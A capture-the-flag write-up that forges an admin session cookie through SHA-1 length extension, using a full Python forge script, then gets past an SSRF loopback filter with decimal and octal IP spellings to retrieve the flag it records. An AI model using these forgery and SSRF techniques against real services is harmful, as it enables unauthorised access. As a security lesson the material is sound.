# Operation Dawn: The Standing Order

> Web · Medium · Terminal43  
> Points: 289 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{xPcPTtsPQukuZ9B43Xpw01nj}`

The challenge ran on a per-team web instance that is no longer up, and each team's flag value was its own, so the requests below cannot be re-run — they are shown exactly as sent, with the host written as `<instance>`.

**Challenge**

Operation Dawn, annex entry 14, the set's boss. A captured enemy "command relay console" has been stood back up. An operator session can read field dispatches, but relay control is held for `command`, and the standing order sits on a node the console only reaches from the inside. The task is to work up to command and bring the standing order back out. There is no attachment — the whole challenge is the live console.

**Approach / walkthrough**

*Tools:* `curl` for every request, and a small pure-Python SHA-1 length-extension script (standard library). hashpumpy would do the same job in one call, but it failed to build against the local OpenSSL headers, so the attack was reimplemented in Python.

*1. Meet the field relay.* `curl -i http://<instance>/` greets you as an operator, hands a session cookie, and names the gate:

```
set-cookie: session=757365723d677565737426726f6c653d6f70657261746f72.5affcbf0d5ec469798c3e49174ec3610a5480656; Path=/; HttpOnly; SameSite=Lax
...
command relay control is at <a href='/relay'>/relay</a> (role=admin). the operator session cannot reach it.
```

*2. Take the cookie apart.* The value is `hex(payload).mac`. Decoding the hex:

```sh
python3 -c "print(bytes.fromhex('757365723d677565737426726f6c653d6f70657261746f72').decode())"
# user=guest&role=operator
```

The MAC is 40 hex chars = 20 bytes, the size of a SHA-1 digest. It is not a bare hash of the payload — `sha1(payload)`, `md5(payload)` and `sha1(hex)` all differ from the observed MAC — so a secret is mixed in. Requesting `/relay` with the operator cookie shows the lock ("relay control is restricted to command (role=admin)"), and hex-editing the payload to `role=admin` while keeping the old MAC still lands on the 403 page: the server checks the MAC, so the payload cannot simply be rewritten.

*3. Why the MAC folds.* A 20-byte MAC over `secret + payload` is the classic secret-prefix construction `sha1(secret + payload)`, which is open to length extension. SHA-1 is Merkle–Damgård: the digest *is* the internal 5-word state after absorbing `secret + payload`, and that state is exactly what the 20-byte MAC hands you. Starting from it you can keep hashing and produce a valid MAC for `sha1(secret + payload + glue + suffix)` for any suffix, without ever learning the secret. The glue is SHA-1 padding for a message of `len(secret) + len(payload)` bytes: `0x80`, zeros, then the 64-bit bit-length. The cookie format helps twice: the server hex-decodes the payload (so the binary glue rides along inside a parameter value) and splits it on `&` (and the glue contains no `&`), so the appended `&role=admin` arrives as its own clean parameter beside the junked `role=operator...`.

*4. Forge the admin cookie.* A minimal SHA-1 that can resume from a captured state does the attack:

```python
import struct, sys

def md_pad(total_len):
    return b"\x80" + b"\x00"*((55-total_len)%64) + struct.pack(">Q", total_len*8)

def left_rotate(n, b): return ((n<<b)|(n>>(32-b))) & 0xFFFFFFFF

def sha1_from_state(message, state, block_count):
    h = list(state)
    padded = message + md_pad(block_count*64 + len(message))
    for off in range(0, len(padded), 64):
        w = list(struct.unpack(">16I", padded[off:off+64]))
        for i in range(16, 80):
            w.append(left_rotate(w[i-3]^w[i-8]^w[i-14]^w[i-16], 1))
        a,b,c,d,e = h
        for i in range(80):
            if   i<20: f=(b&c)|(~b&d&0xFFFFFFFF); k=0x5A827999
            elif i<40: f=b^c^d;                   k=0x6ED9EBA1
            elif i<60: f=(b&c)|(b&d)|(c&d);        k=0x8F1BBCDC
            else:      f=b^c^d;                    k=0xCA62C1D6
            t=(left_rotate(a,5)+f+e+k+w[i])&0xFFFFFFFF
            e,d,c,b = d,c,left_rotate(b,30),a; a=t
        h=[(x+y)&0xFFFFFFFF for x,y in zip(h,(a,b,c,d,e))]
    return struct.pack(">5I", *h)

def forge(payload, mac, suffix, key_len):
    glue = md_pad(key_len + len(payload))
    state = struct.unpack(">5I", mac)
    blocks = (key_len + len(payload) + len(glue)) // 64
    return payload + glue + suffix, sha1_from_state(suffix, state, blocks)

cookie, key_len, suffix = sys.argv[1], int(sys.argv[2]), sys.argv[3].encode()
ph, mh = cookie.split(".")
ext, mac = forge(bytes.fromhex(ph), bytes.fromhex(mh), suffix, key_len)
print(f"session={ext.hex()}.{mac.hex()}")
```

The one unknown is `len(secret)`, and it costs nothing to find: a wrong length gives a MAC the server rejects with the same 403; the right one opens the console. Sweep it:

```sh
ORIG='757365723d677565737426726f6c653d6f70657261746f72.5affcbf0d5ec469798c3e49174ec3610a5480656'
for klen in $(seq 0 16); do
  C=$(python3 forge.py "$ORIG" "$klen" '&role=admin')
  printf '%s ' "$klen"
  curl -s -o /dev/null -w '%{http_code}\n' -H "Cookie: $C" http://<instance>/relay
done
```

Lengths 0–15 return `403` and length `16` returns `200`. The secret is 16 bytes — the only length that lines the glue padding up with the real one. Forging at `klen 16` gives the working cookie, whose payload is now `user=guest&role=operator` + 24 bytes of SHA-1 padding + `&role=admin`.

*5. Open the command console.* `curl -s -H "Cookie: $COOKIE" http://<instance>/relay` now returns `Command Relay Control`, mapping three relay nodes (`node1.relay.internal`, `node2`, `node3`), naming the internal provisioning service `http://127.0.0.1:9091/order`, and offering a node status probe at `/relay/probe?target=<url>` that fetches any URL server-side (SSRF).

*6. Probe your way inside.* The obvious target is refused:

```sh
curl -s -H "Cookie: $COOKIE" 'http://<instance>/relay/probe?target=http://127.0.0.1:9091/order'
# relay target refused: 127.0.0.1
```

`localhost` and `::1` are refused the same way (400); the three relay node names answer `502 relay probe failed` because they do not resolve — so the guard is a string check on the host, not a real network boundary. Loopback written as a single 32-bit decimal, `2130706433`, is still `127.0.0.1` to whatever resolves it on the far end:

```sh
curl -i -H "Cookie: $COOKIE" 'http://<instance>/relay/probe?target=http://2130706433:9091/order'
```

```
HTTP/1.0 200 OK
content-type: text/plain; charset=utf-8
content-length: 32

CSCTF{xPcPTtsPQukuZ9B43Xpw01nj}
```

The probe fetched the internal provisioning node and the 32-byte order came straight back out through the console. The octal (`0177.0.0.1`) and zero-padded (`127.0.000.1`) spellings also got past the filter; the `0x7f000001` hex forms returned `502`.

**Why it works**

The session cookie authenticates you with `sha1(secret + payload)` — a secret-prefix MAC instead of HMAC — and a Merkle–Damgård digest hands out its own internal state, so the MAC over `user=guest&role=operator` is a valid starting state for the MAC over that payload plus anything glued on. Because the server hex-decodes the payload and splits it on `&`, the binary SHA-1 padding vanishes inside the first `role=` value and the appended `&role=admin` parses as a clean parameter, granting command access without the secret ever being known. The command console then exposes a fetch-anything probe whose only protection is a string comparison against literal hosts (`127.0.0.1`, `localhost`, `::1`), and `2130706433` is just another spelling of the same address that the URL fetcher happily resolves to loopback.

**Validation / reproduction**

The key-length sweep gave exactly one length (16) that opened `/relay`, which proves the forged MAC was accepted and the server was not simply ignoring the cookie. The internal provisioning response was a bare `CSCTF{...}` string, accepted on the first submission. To reproduce: capture the operator cookie, confirm the MAC is secret-prefix SHA-1 (not a plain hash), length-extend `&role=admin` and sweep `key_len` 0–16, then SSRF the probe to `http://2130706433:9091/order`. Gotchas: keep the glue bytes inside the hex payload exactly (any client that touches the cookie breaks the MAC), and remember loopback has many spellings — decimal and octal passed the guard here, hex did not.
